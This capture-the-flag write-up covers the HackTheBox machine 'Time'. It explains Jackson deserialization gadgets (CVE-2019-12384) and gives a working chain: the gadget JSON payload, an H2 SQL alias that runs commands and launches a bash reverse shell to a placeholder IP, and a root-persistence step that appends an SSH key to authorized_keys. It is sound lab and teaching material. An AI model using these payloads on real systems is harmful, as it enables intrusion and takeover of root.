---
title: Time
tags:
- writeups
---

## Overview

This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing **JSON's** leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequently, just importing your pub **SSH** key into the `authorized_keys` file will grant access to root.


## Enumeration

Running nmap reveals 2 services:

```bash
> nmap -sC -sV -oA nmap/time 10.10.10.214
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Once we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let's check that first.
<br>

Upon submitting `{"test"}` we see the following error: 
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

So it's expecting an array: `["test"]`. 
But that also throws an error: 
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'test' as a subtype of [simple type, class java.lang.Object]: no such class found
```

Now, in both of our errors we see that they're thrown by a library called *jackson*, which is used to 
serialize or map POJO *(Plain Old Java Objects)* to JSON and deserialize JSON to POJO. With some more searching we find a [CVE](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.


## Understanding the CVE

### What is serialization/deserialization
In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization & deserialization is. Swapneil Kumar Dash wrote a beautiful [article](https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d) about this, however I will provide a short overview in this post as well. 

> In computing, serialization  is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.

In our case, we translate java objects into JSON and vice-versa.

#### What could go wrong ?

Usually, in java we can use something like this to deserialize data:
```java
...
FileInputStream fin  = new FileInputStream("your/file/path");
ObjectInputStream in = new ObjectInputStream(fin);
customClassInstance  = (CustomClass) in.readObject();
...
```
The main problem lies within the way readObject deserializes data which executes the class while also
throwing an error if we give it a serialized input of a different class.

I won't go into much detail here on this topic, since it's a broad one. However, if you're interested in 
learning more about it you should check the resources and [this talk](https://www.youtube.com/watch?v=t-zVC-CxYjw) by **Alexei Kojenov** which also made some great [examples](https://github.com/kojenov/serial) you can play 
around with.

### How java gadgets work
Gadgets are just a class or funcion that's available within the executing scope of an application. For example the following code is a simple implementation in Java:
```java
/* CacheManager.java */
public class CacheManager implements Serializable {
	private final Runnable initHook;
	public void readObject(ObjectInputStream in) {
		in.defaultReadObject();

		initHook.run();
	}
}

/* CommandTask.java */
public class CommandTask implements Runable, Serializable {
	private final String cmd;
	public CommandTask(String cmd) {
		this.cmd = cmd;
	}

	public void run() {
		Runtime.getRuntime().exec(cmd);
	}
}
```

Here, an attacker can inject a serialized `CommandTask` into an input stream that will be read by `CacheManager`, which in return invokes run. Therefore, he gains arbitrary command execution.
<br>

### Jackson library deserialization vulnerability POC
The *CVE* of interest is focusing mostly on the *Jackson* library. They found that when *Jackson* deserializes a specific class (`ch.qos.logback.core.db.DriverManagerConnectionSource`), it can be abused to instantiate a Java Database Connectivity *(JDBC)*, which is used to connect & interact with the dabase. To understand better let's break down the payload used in the [**POC**](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html):

`$ "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"`

As said previously we use the `DriverManagerConnectionSource` class to pass an url, which will trigger [`setUrl`](https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl(java.lang.String)). Afterwards, the object is serialized into a JSON object again. Consequently, the `getConnection()` [method](https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection()) is called which creates an in-memory database. This is further used to create a remote connection.
<br>

Until now, we've only got a way to generate a Server Side Request Forgery *(SSRF)*. So how could we turn this into a full chain RCE ?
In order to achieve that, the guys from [doyensec](https://doyensec.com/) leveraged the [H2](http://www.h2database.com/html/features.html) JDBC driver which has the capability to run SQL scripts from the JDBC url. This alone won't allow an attacker to run Java code inside the JVM context, however H2 has the capability to specify custom aliases containing java code [which can be abused](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html).

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())
		.useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('whoami')
```

As a result, we only need to serve a sql file to the target machine that makes the request to our in-memory *DB* with the use of `DriverManagerConnectionSource` and we have remote code execution.


## Leveraging what we've learned to own user

We've learned that we can use a deserialization vulnerability within Jackson to leverage a connection to a in-memory *DB*, which accepts aliases that can be used to execute commands. So, all wee need to do is:

1. *Prepare the `inject.sql` script*
```java
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())
		.useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/IP/PORT 0>&1')
```

2. *Setup http server & netcat listener*
![](https://i.imgur.com/kYaG0vZ.png)


3. *Abuse the deserialization vulnerability & use the `DriverManagerConnectionSource` gadget*

4. *Enjoy your shell*
![](https://i.imgur.com/jh0fwLP.png)



## Privilige escalation

Once on the box, a simple enumeration reveals that we have write access to a backup script ran by root.
```bash
bash-5.0$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

So, we could just import our public SSH key and have root access.
```bash
echo "echo SSH_PUB_KEY >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```


## Conclusion
I've seen that a lot of people said that this box is easy, which I can agree in the way that you can find the CVE quite easy and modify the POC payload to get the flags and move on, without diving more into it. However, I think that this is a great box for someone new and even for some more experienced people. I say this because if you really want to understand what's going on behind the scenes, which you should, you understand new concepts such as: *java deserialization, gadgets, how an actual CVE is found, etc*.

Honestly, I learned a lot by playing around with this box and afterall this is the goal of *HTB*. To learn new concepts that you can add to your skill-set which elevates your craft.

If you want to dig deeper into deserealization attacks within java libraries, I suggest you check the references down below. I found some really great articles/talks about this subject which I can't give enough credit.

## References
- [Understanding Java Deserialization](https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d)
- [Java deserealization lib to secure apps](https://github.com/ikkisoft/SerialKiller)
- [Understanding insecure implementation of Jackson deserialization](https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038)
- [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [SnakeYaml Deserilization exploited](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858)
- [POC tool 4 generating payloads that exploit unsage Java object deserilization](https://github.com/frohoff/ysoserial)
- [Depickling, gadgets and chains: The class of exploit that unraveled Equifax](https://brandur.org/fragments/gadgets-and-chains)
- [POC Jackson deserilization on Spring web app](https://github.com/galimba/Jackson-deserialization-PoC)
- [Java deserilization cheat-sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
- [Jackson Library](https://github.com/FasterXML/jackson)
- [Marshalling Pickles - OWASP AppSec California 2015](https://www.youtube.com/watch?v=KSA7vUkXGSg)
- [CVE-2019-12384](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)

## See Also
- [[write-ups/HTB]]